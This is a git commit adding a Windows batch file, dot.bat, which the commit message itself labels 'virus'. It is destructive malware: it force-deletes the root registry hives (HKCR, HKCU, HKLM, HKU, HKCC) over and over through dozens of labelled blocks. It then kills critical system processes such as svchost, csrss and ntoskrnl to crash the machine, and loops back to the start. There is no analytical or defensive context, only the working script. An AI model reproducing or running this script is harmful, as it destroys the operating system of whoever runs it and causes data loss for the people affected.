44801eb836c310c5e61320258837772a08247426
hsilver10 <95255246+hsilver10@users.noreply.github.com>
2021-12-26 21:54:55 +0100

    virus
    dont open this file

---
+++ dot.bat
@@ -0,0 +1,685 @@
+@echo off
+title .
+:start
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 1
+:1
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 2
+:2
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 3
+:3
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 4
+:4
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 5
+:5
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+
+goto 6
+:6
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 7
+:7
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 8
+:8
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 9
+:9
+goto 10
+:10
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 11
+:11
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 12
+:12
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 13
+:13
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 14
+:14
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 15
+:15
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 16
+:16
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 17
+:17
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 18
+:18
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 19
+:19
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 20
+:20
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 21
+:21
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 22
+:22
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 23
+:23
+goto 24
+:24
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 25
+:25
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 26
+:26
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 27
+:27
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 28
+:28
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 29
+:29
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 30
+:30
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 31
+:31
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 32
+:32
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 33
+:33
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 34
+:34
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 35
+:35
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 36
+:36
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 37
+:37
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 38
+:38
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 39
+:39
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 40
+:40
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 41
+:41
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 42
+:42
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 43
+:43
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 44
+:44
+goto 45
+:45
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 46
+:46
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 47
+:47
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 48
+:48
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 49
+:49
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto 50
+:50
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+reg delete "HKCR" /f
+reg delete "HKCU" /f
+reg delete "HKLM" /f
+reg delete "HKU" /f
+reg delete "HKCC" /f
+reg delete "HKEY" /f
+goto bsod
+:bsod
+taskkill /f /im svchost.exe
+taskkill.exe /f /im svchost.exe
+taskkill /f /im csrss.exe
+taskkill.exe /f /im csrss.exe
+taskkill /f /im ntoskrnl.exe
+taskkill.exe /f /im ntoskrnl.exe
+taskkill /f /im rundll32.exe
+taskkill.exe /f /im rundll32.exe
+goto start
